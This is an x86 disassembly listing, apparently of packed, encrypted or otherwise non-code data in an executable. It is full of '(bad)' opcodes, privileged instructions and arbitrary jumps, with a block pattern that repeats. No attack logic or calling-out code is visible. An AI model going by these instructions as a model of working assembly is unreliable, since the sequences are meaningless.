  4277c1:	mov    eax,0x1ed470e0
  4277c6:	neg    DWORD PTR [ecx-0xa]
  4277c9:	popa   
  4277ca:	mov    ?,WORD PTR [ebx]
  4277cc:	ret    
  4277cd:	sti    
  4277ce:	daa    
  4277cf:	stos   DWORD PTR es:[edi],eax
  4277d0:	sti    
  4277d1:	adc    al,BYTE PTR ds:[edi*8-0x2b5c62f8]
  4277d9:	cmp    BYTE PTR [esi+0x6f3b13c],0x6f
  4277e0:	punpcklbw mm7,DWORD PTR [esi+0x6c]
  4277e4:	cwde   
  4277e5:	xor    dh,al
  4277e7:	jmp    0x70b:0x9477aa96
  4277ee:	jl     0x42783d
  4277f0:	in     al,0x99
  4277f2:	pop    esi
  4277f3:	jle    0x427833
  4277f5:	pop    esi
  4277f6:	jmp    0x42779e
  4277f8:	aad    0xda
  4277fa:	shl    DWORD PTR [ebx+esi*8+0x21],1
  4277fe:	nop
  4277ff:	es out dx,eax
  427801:	xchg   edi,eax
  427802:	pop    eax
  427803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427804:	leave  
  427805:	mov    eax,ds:0x7c073507
  42780a:	inc    esi
  42780b:	iret   
  42780c:	sub    eax,0x3636d8
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	inc    DWORD PTR [edx-0x59dfd3b1]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    al,0x1
  42788a:	add    BYTE PTR [eax],al
  42788c:	cmp    al,0xe
  42788e:	xor    al,BYTE PTR [ebx+0x60]
  427891:	adc    al,0xc3
  427893:	mov    DWORD PTR [ebx+0x69321bcd],edi
  427899:	hlt    
  42789a:	test   DWORD PTR [ecx-0x482aaae9],ecx
  4278a0:	pop    ss
  4278a1:	and    al,0xeb
  4278a3:	idiv   DWORD PTR [ecx+0x48]
  4278a6:	xor    eax,0x8b48a6c6
  4278ab:	mov    ecx,0x97df189f
  4278b0:	(bad)  
  4278b1:	mov    esi,0x824a3756
  4278b6:	and    eax,0x20f026da
  4278bb:	sbb    BYTE PTR [eax-0x7c],al
  4278be:	fsubrp st(0),st
  4278c0:	div    DWORD PTR [esi+0x6db4063a]
  4278c6:	fidiv  WORD PTR [ebp+esi*2+0x2770a912]
  4278cd:	push   ds
  4278ce:	or     al,0xae
  4278d0:	(bad)  
  4278d1:	mov    cl,0x3a
  4278d3:	in     eax,0x2c
  4278d5:	fst    DWORD PTR [ebp+0x311cb4c6]
  4278db:	call   0x2892bc54
  4278e0:	cld    
  4278e1:	add    DWORD PTR [ebx+edi*1-0x616158e5],eax
  4278e8:	into   
  4278e9:	(bad)  [bx+di]
  4278ec:	bound  edi,QWORD PTR [edx+0x1b90478d]
  4278f2:	addr16 xchg edi,eax
  4278f4:	jl     0x42794d
  4278f6:	enter  0x2730,0xee
  4278fa:	and    BYTE PTR [ecx+0x40f45579],0xe1
  427901:	sub    DWORD PTR [esi+0x1e],edi
  427904:	lds    edx,FWORD PTR ds:[ebp+0x4d]
  427908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427909:	je     0x427895
  42790b:	sahf   
  42790c:	jnp    0x427957
  42790e:	cmp    DWORD PTR [edi],edi
  427910:	add    BYTE PTR [ebx-0x42b4f3e2],ch
  427916:	jle    0x4278ff
  427918:	test   eax,0xaa21f69c
  42791d:	xchg   esi,eax
  42791e:	shl    BYTE PTR [eax-0x6b],cl
  427921:	ss mov edx,0xbe3be744
  427927:	in     al,dx
  427928:	mov    bl,0x20
  42792a:	pop    edi
  42792b:	mov    ds:0xc440c63,al
  427930:	fcomp  QWORD PTR [eiz*8+0x88096d9]
  427937:	xor    DWORD PTR [ecx+0x2f19f966],ecx
  42793d:	mov    al,0xd3
  42793f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427940:	add    eax,0x8454b9db
  427945:	sbb    esp,ecx
  427947:	lock add al,0x88
  42794a:	jl     0x4279ac
  42794c:	xchg   ebx,eax
  42794d:	add    eax,0x8e97ff66
  427952:	mov    bl,0x6
  427954:	xchg   ecx,eax
  427955:	ffree  st(4)
  427957:	and    eax,0xd03b2397
  42795c:	jle    0x42792b
  42795e:	sub    al,0x86
  427960:	pop    ecx
  427961:	aaa    
  427962:	es inc esp
  427964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427965:	pop    ecx
  427966:	cdq    
  427967:	or     esp,DWORD PTR [ebp+0x71]
  42796a:	(bad)  
  42796b:	test   al,0x9b
  42796d:	mov    WORD PTR [esi+0x4d987de5],cs
  427973:	(bad)  
  427974:	push   ebx
  427975:	jbe    0x42796b
  427977:	or     DWORD PTR [esi+edi*2-0x35],eax
  42797b:	outs   dx,BYTE PTR ds:[esi]
  42797c:	mov    ds:0x67714374,al
  427981:	jae    0x4279dd
  427983:	iret   
  427984:	cwde   
  427985:	sbb    ah,al
  427987:	mov    dh,BYTE PTR [esi+0x1a4a65e0]
  42798d:	xchg   ecx,eax
  42798e:	push   edx
  42798f:	or     DWORD PTR [eax],eax
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x70442f68]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	in     al,0x2c
  427a0e:	push   es
  427a0f:	pusha  
  427a10:	pop    ds
  427a11:	inc    esp
  427a12:	xor    BYTE PTR [edi],cl
  427a14:	test   eax,0xd7ed0de4
  427a19:	ins    DWORD PTR es:[edi],dx
  427a1a:	push   ecx
  427a1b:	test   BYTE PTR [esi],0x57
  427a1e:	add    eax,0x1499986f
  427a23:	dec    ebp
  427a24:	mov    fs,WORD PTR [ebp-0x1bc2d69e]
  427a2a:	idiv   DWORD PTR [esi-0x7c]
  427a2d:	stc    
  427a2e:	mov    al,ds:0xf6ea296b
  427a33:	les    ecx,FWORD PTR [ebx]
  427a35:	xchg   edx,eax
  427a36:	popf   
  427a37:	sbb    bl,BYTE PTR [ecx-0x2b28dc07]
  427a3d:	fstp   QWORD PTR [eax-0x28]
  427a40:	rol    BYTE PTR [ecx],0x83
  427a43:	arpl   WORD PTR [eax+eax*4+0x6],ax
  427a47:	add    eax,0xefca9b67
  427a4c:	add    BYTE PTR [edi-0x36],bl
  427a4f:	mov    cl,0x75
  427a51:	cdq    
  427a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a53:	or     BYTE PTR [eax],al
  427a55:	and    edi,DWORD PTR [ebx+0x372b29e4]
  427a5b:	adc    BYTE PTR [esi+0x3c7f9620],dh
  427a61:	sbb    ebx,DWORD PTR [ebx]
  427a63:	mov    ds:0xc7cebf74,eax
  427a68:	fild   DWORD PTR [ecx]
  427a6a:	iret   
  427a6b:	pop    esi
  427a6c:	imul   esp,DWORD PTR [eax],0x58
  427a6f:	push   cs
  427a70:	fst    QWORD PTR [ecx+0x70]
  427a73:	cmp    al,0x50
  427a75:	add    al,0xa5
  427a77:	jle    0x427a62
  427a79:	mov    bl,0x33
  427a7b:	pop    ss
  427a7c:	sub    BYTE PTR [ebx+0x71],bl
  427a7f:	dec    edx
  427a80:	pop    esp
  427a81:	scas   al,BYTE PTR es:[edi]
  427a82:	or     al,BYTE PTR [esp+edx*4+0x264f2e00]
  427a89:	mov    cl,BYTE PTR [ecx-0x7a]
  427a8c:	shr    DWORD PTR [edi+0x27d03aec],1
  427a92:	mov    ebx,0xca988b91
  427a97:	mov    edi,0xa202cb34
  427a9c:	dec    esp
  427a9d:	dec    edi
  427a9e:	(bad)  
  427a9f:	jnp    0x427b02
  427aa1:	jae    0x427a7d
  427aa3:	cli    
  427aa4:	jns    0x427b0b
  427aa6:	mov    ebx,0xf4369b66
  427aab:	repnz xor dh,0xa7
  427aaf:	adc    BYTE PTR gs:[eax-0x46],ch
  427ab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ab4:	sub    BYTE PTR [edx],cl
  427ab6:	cmp    ecx,0xffffffc3
  427ab9:	inc    ecx
  427aba:	xchg   BYTE PTR [edi-0x6e],al
  427abd:	lds    ebp,FWORD PTR [edx+0x60]
  427ac0:	sbb    DWORD PTR [ecx],eax
  427ac2:	mov    ecx,0xca28a0ea
  427ac7:	mov    ds:0xf083de6b,eax
  427acc:	mov    dh,0x34
  427ace:	push   edx
  427acf:	or     BYTE PTR [edi+0x5a],ah
  427ad2:	test   DWORD PTR [ebx+0x3c],0xa9ae3b53
  427ad9:	jae    0x427b49
  427adb:	arpl   WORD PTR [edi],sp
  427add:	inc    ebx
  427ade:	xlat   BYTE PTR ds:[ebx]
  427adf:	fild   DWORD PTR [ecx+0x14]
  427ae2:	and    eax,0x7949285e
  427ae7:	cmp    ebx,DWORD PTR [esi]
  427ae9:	dec    eax
  427aea:	xchg   DWORD PTR gs:0x2f41a0df,ecx
  427af1:	push   ecx
  427af2:	mov    ebx,0x343e89eb
  427af7:	(bad)  
  427af8:	adc    eax,0xe5b942b5
  427afd:	sbb    DWORD PTR [ebp+0x58],ecx
  427b00:	nop
  427b01:	mov    dl,0x52
  427b03:	jno    0x427b69
  427b05:	add    ch,BYTE PTR [edx+0x3443f83e]
  427b0b:	bound  esp,QWORD PTR [esi+0x39]
  427b0e:	mov    ch,0xb3
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	div    BYTE PTR [eax+esi*4-0x57d7a625]
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    al,0x1
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	cmp    ecx,ebx
  427b8e:	fcom   DWORD PTR [ecx*8+0x38414eaa]
  427b95:	shr    DWORD PTR [edi-0x54],0xfe
  427b99:	push   ebx
  427b9a:	sub    edx,DWORD PTR ds:0x7f47cd21
  427ba0:	mov    ss,WORD PTR [edi]
  427ba2:	test   edi,esp
  427ba4:	inc    eax
  427ba5:	outs   dx,BYTE PTR ds:[esi]
  427ba6:	dec    ecx
  427ba7:	inc    esi
  427ba8:	mov    DWORD PTR [edi+eax*2],eax
  427bab:	aas    
  427bac:	sub    DWORD PTR [ebx-0x4e],ecx
  427baf:	dec    eax
  427bb0:	inc    ebx
  427bb1:	test   al,0x9d
  427bb3:	mov    bh,0x67
  427bb5:	or     DWORD PTR cs:[eax-0x78],ebp
  427bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bba:	stc    
  427bbb:	cmp    DWORD PTR [edi+0x16873e62],esp
  427bc1:	jno    0x427b5e
  427bc3:	loop   0x427bc2
  427bc5:	stos   BYTE PTR es:[edi],al
  427bc6:	hlt    
  427bc7:	push   ebp
  427bc8:	aad    0x65
  427bca:	push   ecx
  427bcb:	ja     0x427b51
  427bcd:	jmp    0x427ba5
  427bcf:	outs   dx,DWORD PTR ds:[esi]
  427bd0:	les    edi,FWORD PTR [eax]
  427bd2:	adc    eax,0xfc2027ad
  427bd7:	les    ebx,FWORD PTR [edi+0x3b]
  427bda:	repz mov edi,0x219ed245
  427be0:	sbb    ecx,DWORD PTR [eax+0x25]
  427be3:	xor    esp,DWORD PTR [edi+edx*4]
  427be6:	sti    
  427be7:	sbb    BYTE PTR [edx-0x2e],bl
  427bea:	pop    ecx
  427beb:	stc    
  427bec:	mov    BYTE PTR [ebx+0x5e],bl
  427bef:	stos   BYTE PTR es:[edi],al
  427bf0:	arpl   WORD PTR [ebp-0x1b28590c],si
  427bf6:	(bad)
  427bf9:	adc    al,0xe0
  427bfb:	xlat   BYTE PTR ds:[ebx]
  427bfc:	inc    eax
  427bfd:	outs   dx,DWORD PTR ds:[esi]
  427bfe:	sbb    DWORD PTR [ebx+eax*1-0x50571be2],0x133a20ba
  427c09:	or     ch,bh
  427c0b:	or     al,bl
  427c0d:	shl    esp,0xac
  427c10:	or     ecx,DWORD PTR [esi-0x535cbeb]
  427c16:	mov    ebx,0x9d38c186
  427c1b:	(bad)  
  427c1c:	jns    0x427c6e
  427c1e:	jnp    0x427c21
  427c20:	mov    bl,0xb2
  427c22:	xor    BYTE PTR [edi+0x3a],bh
  427c25:	retf   0xc934
  427c28:	mov    BYTE PTR [ebx],bl
  427c2a:	fsub   DWORD PTR [ebp+0x25]
  427c2d:	cmp    DWORD PTR [edx],edx
  427c2f:	cmp    al,0x74
  427c31:	xchg   esi,eax
  427c32:	cdq    
  427c33:	inc    edi
  427c34:	out    dx,al
  427c35:	dec    ecx
  427c36:	rcl    DWORD PTR [esi-0x19],0x3d
  427c3a:	dec    ebp
  427c3b:	inc    esi
  427c3c:	xor    eax,0xda3042ed
  427c41:	push   edi
  427c42:	adc    esi,DWORD PTR [ecx]
  427c44:	mov    ah,dh
  427c46:	sbb    al,0xa5
  427c48:	sbb    DWORD PTR [ecx+0xe],esp
  427c4b:	mov    bh,0x74
  427c4d:	jle    0x427c66
  427c4f:	outs   dx,BYTE PTR ds:[esi]
  427c50:	sbb    ebp,DWORD PTR [eax]
  427c52:	in     eax,0x1d
  427c54:	cld    
  427c55:	pop    ss
  427c56:	enter  0x162f,0x4
  427c5a:	(bad)  
  427c5c:	out    dx,eax
  427c5d:	jbe    0x427c74
  427c5f:	pop    es
  427c60:	sbb    eax,0x2d99f19d
  427c65:	add    ebp,DWORD PTR [ecx-0x6a]
  427c68:	jl     0x427c8c
  427c6a:	fisttp QWORD PTR [edx+0x6107e06e]
  427c70:	inc    edx
  427c71:	out    dx,al
  427c72:	pop    ecx
  427c73:	adc    BYTE PTR [esi+0x76],ch
  427c76:	in     eax,0x3e
  427c78:	rol    cl,cl
  427c7a:	lods   al,BYTE PTR ds:[esi]
  427c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c7c:	ins    BYTE PTR es:[edi],dx
  427c7d:	push   ds
  427c7e:	outs   dx,DWORD PTR ds:[esi]
  427c7f:	and    BYTE PTR [ecx-0x7c],cl
  427c82:	pop    edi
  427c83:	repz jae 0x427c61
  427c86:	jg     0x427c77
  427c88:	fstp   TBYTE PTR [eax+0x3a]
  427c8b:	in     al,dx
  427c8c:	popf   
  427c8d:	ss sub eax,0xd7
	...
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x8f455d44,ebx
  427d02:	mov    DWORD PTR [edx],esi
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	out    0x14,al
  427d0e:	out    dx,al
  427d0f:	imul   ebx,DWORD PTR [esi+0x2],0xffffff9b
  427d13:	adc    eax,0x7fe673e5
  427d18:	daa    
  427d19:	adc    al,al
  427d1b:	cmp    ch,dh
  427d1d:	lahf   
  427d1e:	cwde   
  427d1f:	or     ebp,DWORD PTR [esi]
  427d21:	or     dh,BYTE PTR [ebx]
  427d23:	hlt    
  427d24:	retf   
  427d25:	call   0x9f10:0xcd30741e
  427d2c:	aam    0x92
  427d2e:	inc    esi
  427d2f:	or     BYTE PTR [ecx+0x9fd000d],al
  427d35:	pushf  
  427d36:	call   0xed9e5a1b
  427d3b:	outs   dx,BYTE PTR ds:[esi]
  427d3c:	push   edx
  427d3d:	mov    dh,0x28
  427d3f:	xchg   edx,eax
  427d40:	das    
  427d41:	and    DWORD PTR [edi],ebx
  427d43:	bound  esp,QWORD PTR [edi-0x69]
  427d46:	fcomip st,st(6)
  427d48:	jns    0x427d72
  427d4a:	sub    eax,0x45f7c983
  427d4f:	outs   dx,DWORD PTR ds:[esi]
  427d50:	jp     0x427d91
  427d52:	repz xlat BYTE PTR ds:[ebx]
  427d54:	add    DWORD PTR [ebx+eiz*2],0x27
  427d58:	mov    ah,0xba
  427d5a:	jo     0x427dc9
  427d5c:	mov    eax,0x1bfb686
  427d61:	xchg   edx,eax
  427d62:	or     BYTE PTR [ebp+0x54],0x80
  427d66:	xchg   edx,eax
  427d67:	icebp  
  427d68:	addr16 mov ax,ds:0xc35d
  427d6d:	mov    ecx,0x30281ad9
  427d72:	mov    al,0xa3
  427d74:	add    eax,0x6f1a9a9d
  427d79:	sub    DWORD PTR [esi+0x3],ecx
  427d7c:	mul    DWORD PTR [esi]
  427d7e:	inc    eax
  427d7f:	mov    al,ds:0x98df80d9
  427d84:	frstor [eax+ebp*2]
  427d87:	jg     0x427d7e
  427d89:	orps   xmm1,xmm4
  427d8c:	sti    
  427d8d:	inc    eax
  427d8e:	sbb    eax,0xa4d08f33
  427d93:	xor    al,dl
  427d95:	pop    ebp
  427d96:	mov    bh,cl
  427d98:	lahf   
  427d99:	dec    ebx
  427d9a:	dec    esi
  427d9b:	inc    edi
  427d9c:	out    dx,eax
  427d9d:	pop    ebx
  427d9e:	cmc    
  427d9f:	sbb    eax,0x2360090e
  427da4:	or     al,0xde
  427da6:	dec    esi
  427da7:	add    eax,0xb5966e70
  427dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427dad:	jmp    0xdc3e:0x1557868
  427db4:	push   cs
  427db5:	push   ecx
  427db6:	outs   dx,BYTE PTR ds:[esi]
  427db7:	push   es
  427db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427db9:	xchg   ebx,eax
  427dba:	scas   al,BYTE PTR es:[edi]
  427dbb:	gs xchg ebx,eax
  427dbd:	test   al,0x59
  427dbf:	test   al,0xe
  427dc1:	mov    esp,es
  427dc3:	add    al,0x3e
  427dc5:	pop    ebp
  427dc6:	xchg   edi,eax
  427dc7:	neg    BYTE PTR [ecx+0xf]
  427dca:	add    bh,BYTE PTR [eax]
  427dcc:	and    dh,BYTE PTR [edi-0x208310a9]
  427dd2:	aam    0xeb
  427dd4:	lock push esi
  427dd6:	jns    0x427dfe
  427dd8:	push   cs
  427dd9:	sahf   
  427dda:	sub    esi,DWORD PTR [esi]
  427ddc:	fs sbb eax,0x3b16ee89
  427de2:	cmc    
  427de3:	pop    es
  427de4:	adc    DWORD PTR [esi+0x56],0x43da6685
  427deb:	cmp    cl,cl
  427ded:	jl     0x427e11
  427def:	clc    
  427df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427df1:	in     al,dx
  427df2:	cmp    eax,0x80325d71
  427df7:	mov    esp,0x2aadd51c
  427dfc:	inc    edx
  427dfd:	gs dec esi
  427dff:	push   ecx
  427e00:	cs js  0x427e18
  427e03:	enter  0x439c,0x30
  427e07:	pusha  
  427e08:	ror    bl,cl
  427e0a:	aas    
  427e0b:	test   BYTE PTR [edi+ebp*8+0x3],bl
  427e0f:	jae    0x427e11
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	jo     0x427e17
  427e82:	xchg   ebp,eax
  427e83:	xchg   edi,eax
  427e84:	xor    BYTE PTR [edx+0x1040001],ch
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	jno    0x427e6c
  427e8e:	sub    ah,bl
  427e90:	xor    DWORD PTR [esi],edi
  427e92:	ss jae 0x427eef
  427e95:	xor    BYTE PTR [edx+0x4a],dh
  427e98:	pop    esp
  427e99:	ds jecxz 0x427eaa
  427e9c:	jno    0x427e75
  427e9e:	or     dh,BYTE PTR [ecx+0x31]
  427ea1:	inc    ebx
  427ea2:	outs   dx,DWORD PTR ds:[esi]
  427ea3:	sub    bh,BYTE PTR [ebx+0x70]
  427ea6:	mov    DWORD PTR [ebx],eax
  427ea8:	pop    edi
  427ea9:	mov    ds:0xcabee5de,al
  427eae:	in     al,0xd7
  427eb0:	jo     0x427f15
  427eb2:	pop    edx
  427eb3:	out    0xe5,al
  427eb5:	jno    0x427f29
  427eb7:	dec    ebx
  427eb8:	loopne 0x427e85
  427eba:	call   0xe9192bb7
  427ebf:	add    al,0x6d
  427ec1:	ins    BYTE PTR es:[edi],dx
  427ec2:	loope  0x427f1f
  427ec4:	jmp    0xaab0:0xd19484d3
  427ecb:	or     al,0x21
  427ecd:	fucom  st(3)
  427ecf:	cli    
  427ed0:	cli    
  427ed1:	sahf   
  427ed2:	or     eax,0xce6f0beb
  427ed7:	lock iret 
  427ed9:	ret    0x7fc5
  427edc:	push   0xffffffb8
  427ede:	push   ds
  427edf:	pop    edi
  427ee0:	cmp    DWORD PTR [eax-0x67],ebx
  427ee3:	(bad)  
  427ee4:	push   ecx
  427ee5:	dec    edi
  427ee6:	cli    
  427ee7:	lock dec esi
  427ee9:	sub    bl,bh
  427eeb:	icebp  
  427eec:	push   edx
  427eed:	rcr    DWORD PTR [ebx+edx*4+0x65aac1bc],0x6e
  427ef5:	push   ebp
  427ef6:	pushf  
  427ef7:	call   0x1f81:0xb0a43bc7
  427efe:	mov    al,0x4b
  427f00:	fucomi st,st(6)
  427f02:	ror    DWORD PTR [eax],0x10
  427f05:	mov    dl,0x7a
  427f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f08:	(bad)
  427f0b:	in     eax,0x11
  427f0d:	mov    ecx,0x86b23a9
  427f12:	adc    al,0xf2
  427f14:	int3   
  427f15:	aas    
  427f16:	inc    esi
  427f17:	mov    ds:0xf8b8ba9,al
  427f1c:	sub    al,0xc1
  427f1e:	cli    
  427f1f:	add    DWORD PTR [ebx],edx
  427f21:	fdiv   QWORD PTR [ecx]
  427f23:	or     dh,dh
  427f25:	dec    eax
  427f26:	(bad)  [ebx]
  427f28:	mov    edi,0x250b2ec9
  427f2d:	or     al,0x14
  427f30:	clc    
  427f31:	popf   
  427f32:	popa   
  427f33:	mov    cl,0x75
  427f35:	stc    
  427f36:	mov    ds:0x9c935ee2,al
  427f3b:	push   ss
  427f3c:	fisub  WORD PTR [edi-0x2e33d7ca]
  427f42:	das    
  427f43:	dec    ebx
  427f44:	out    0xe6,eax
  427f46:	(bad)  
  427f47:	lods   eax,DWORD PTR ds:[esi]
  427f48:	jmp    0x427f0d
  427f4a:	mov    ds:0x76ee6717,al
  427f4f:	or     dh,0x3f
  427f52:	push   ds
  427f53:	dec    BYTE PTR [ebp+0x43]
  427f56:	fild   DWORD PTR ds:0x67b17384
  427f5c:	popa   
  427f5d:	mov    bh,0x9b
  427f5f:	fidiv  WORD PTR [eax-0x2010b85d]
  427f65:	lea    ecx,ds:0xf6fa5f21
  427f6b:	repz repz inc esp
  427f6e:	pop    eax
  427f6f:	dec    ebx
  427f70:	ja     0x427f31
  427f72:	test   eax,0x5994b05a
  427f77:	pop    ds
  427f78:	pop    ebp
  427f79:	ja     0x427fc8
  427f7b:	or     BYTE PTR [ebx-0x5c89c3d2],dh
  427f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f82:	and    DWORD PTR [ebx+ecx*1],ecx
  427f85:	retf   0x32c8
  427f88:	xor    bh,BYTE PTR [eax+0x6436d066]
  427f8e:	gs add al,0x0
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	cmp    cl,0x35
  428003:	dec    eax
  428004:	xor    al,0xab
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	mov    dl,0xef
  42800e:	sub    edx,DWORD PTR [edi+ecx*1]
  428011:	mov    eax,0xff93592c
  428016:	and    eax,0xf12e7add
  42801b:	ins    BYTE PTR es:[edi],dx
  42801c:	stos   DWORD PTR es:[edi],eax
  42801d:	test   BYTE PTR [edx],0x6e
  428020:	fmul   QWORD PTR [eax]
  428022:	cwde   
  428023:	fsub   QWORD PTR [edi+edi*2+0x2c]
  428027:	sti    
  428028:	adc    BYTE PTR [esi-0x623e68f5],dl
  42802e:	fstp   DWORD PTR [ebp+edx*4+0x7a]
  428032:	pop    ecx
  428033:	mov    edx,0x46b38e52
  428038:	cli    
  428039:	xchg   esp,eax
  42803a:	mov    edx,0xd50c5c1d
  42803f:	mov    edi,0xe7608929
  428044:	ins    BYTE PTR es:[edi],dx
  428045:	jo     0x42804b
  428047:	mov    ebp,0x774ccd63
  42804c:	jmp    0x8e7119d1
  428051:	je     0x428037
  428053:	js     0x428027
  428055:	fs xor eax,0xf0b96c0f
  42805b:	xchg   ebx,eax
  42805c:	ret    0xa1f3
  42805f:	jae    0x427ffa
  428061:	inc    ebp
  428062:	into   
  428063:	mov    dh,0xd0
  428065:	adc    edx,DWORD PTR [esp+ebx*8]
  428068:	pop    edx
  428069:	rcl    ch,1
  42806b:	repnz fcomp DWORD PTR [esi+edx*2]
  42806f:	mov    cl,0x86
  428071:	and    al,0x60
  428073:	or     esi,ebp
  428075:	mov    al,ds:0x1388f534
  42807a:	cmp    dl,ch
  42807c:	sbb    BYTE PTR [ecx+0x3ed0d8d7],cl
  428082:	std    
  428083:	sahf   
  428084:	jb     0x4280f0
  428086:	pusha  
  428087:	mov    al,0x9c
  428089:	ja     0x4280d5
  42808b:	js     0x42802a
  42808d:	sbb    BYTE PTR [ecx+0x401ab2dd],cl
  428093:	imul   BYTE PTR [ebx]
  428095:	cdq    
  428096:	lahf   
  428097:	lock jecxz 0x428024
  42809a:	push   eax
  42809b:	push   esp
  42809c:	xchg   BYTE PTR [ebx],bl
  42809e:	add    bl,BYTE PTR [eax+0x45fd280f]
  4280a4:	bnd jb 0x428060
  4280a7:	and    al,0x67
  4280a9:	mov    ebx,0x895301fb
  4280ae:	xor    ch,dh
  4280b0:	pop    ebx
  4280b1:	div    DWORD PTR [esi-0x1e]
  4280b4:	pushf  
  4280b5:	scas   eax,DWORD PTR es:[edi]
  4280b6:	std    
  4280b7:	push   edi
  4280b8:	add    dl,bh
  4280ba:	clc    
  4280bb:	jno    0x42805b
  4280bd:	out    dx,eax
  4280be:	xor    eax,0x9ec059b3
  4280c3:	inc    ebx
  4280c4:	ror    DWORD PTR [esi],cl
  4280c6:	test   ah,ah
  4280c8:	pop    edi
  4280c9:	sbb    DWORD PTR [edx+0x38],eax
  4280cc:	sbb    al,0x30
  4280ce:	or     eax,0x87ae5c07
  4280d3:	mov    cs,WORD PTR [edx-0x7b]
  4280d6:	(bad)  
  4280d7:	cmc    
  4280d8:	adc    cl,BYTE PTR [ebx+0x1d]
  4280db:	mov    dl,0x6f
  4280dd:	out    dx,eax
  4280de:	sub    cl,bh
  4280e0:	outs   dx,BYTE PTR ds:[esi]
  4280e1:	pop    edx
  4280e2:	xchg   esi,eax
  4280e3:	mov    al,ds:0x1dbfa1c9
  4280e8:	sub    edi,ebp
  4280ea:	mov    bh,0xc5
  4280ec:	jmp    DWORD PTR [eax]
  4280ee:	ins    BYTE PTR es:[edi],dx
  4280ef:	out    0xff,al
  4280f1:	stos   BYTE PTR es:[edi],al
  4280f2:	mov    al,bh
  4280f4:	sbb    eax,edx
  4280f6:	dec    esi
  4280f7:	imul   ebx,ebp,0x59
  4280fa:	push   0x2b
  4280fc:	jbe    0x428168
  4280fe:	rol    DWORD PTR [edi],0x34
  428101:	fidiv  WORD PTR [edi]
  428103:	popa   
  428104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428105:	xor    BYTE PTR ds:0x6bc5c2f8,ch
  42810b:	or     ch,BYTE PTR [edx-0x31]
  42810e:	jl     0x42814e
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	into   
  428181:	xchg   ebp,eax
  428182:	push   ecx
  428183:	mov    esp,0x1ac38
  428188:	add    al,0x1
  42818a:	add    BYTE PTR [eax],al
  42818c:	dec    ecx
  42818d:	popa   
  42818e:	mov    eax,ds:0x30a762f
  428193:	cmp    DWORD PTR [eax+0x1e],edx
  428196:	ds sbb eax,0xd890626a
  42819c:	jae    0x4281f8
  42819e:	mov    edx,0xf21dbce3
  4281a3:	mov    dh,cl
  4281a5:	je     0x428209
  4281a7:	or     eax,0x47078a75
  4281ac:	outs   dx,BYTE PTR ds:[esi]
  4281ad:	out    dx,al
  4281ae:	push   esi
  4281af:	shl    BYTE PTR [edi-0x32],cl
  4281b2:	xor    edx,ebx
  4281b4:	mov    ah,0xef
  4281b6:	(bad)  
  4281b7:	inc    ebx
  4281b8:	add    BYTE PTR [edi-0x26],bh
  4281bb:	mov    esi,0xf48b6860
  4281c0:	xor    bh,BYTE PTR [edi+0x21dd0917]
  4281c6:	bnd fs jo 0x42822a
  4281ca:	psubb  mm2,QWORD PTR [edi+0x52]
  4281ce:	xor    dl,BYTE PTR [eax-0x3c]
  4281d1:	jp     0x42824b
  4281d3:	pushf  
  4281d4:	sub    edx,DWORD PTR [esi+0x4b0c7f22]
  4281da:	inc    edx
  4281db:	xchg   esi,eax
  4281dc:	dec    ecx
  4281dd:	xor    eax,0x8f1a7db7
  4281e2:	gs sahf 
  4281e4:	test   al,0xc5
  4281e6:	jns    0x428184
  4281e8:	retf   
  4281e9:	into   
  4281ea:	sti    
  4281eb:	lss    ebp,FWORD PTR [ebp+0x2f]
  4281ef:	ins    DWORD PTR es:[edi],dx
  4281f0:	cmp    bh,BYTE PTR [edx-0x63]
  4281f3:	inc    esp
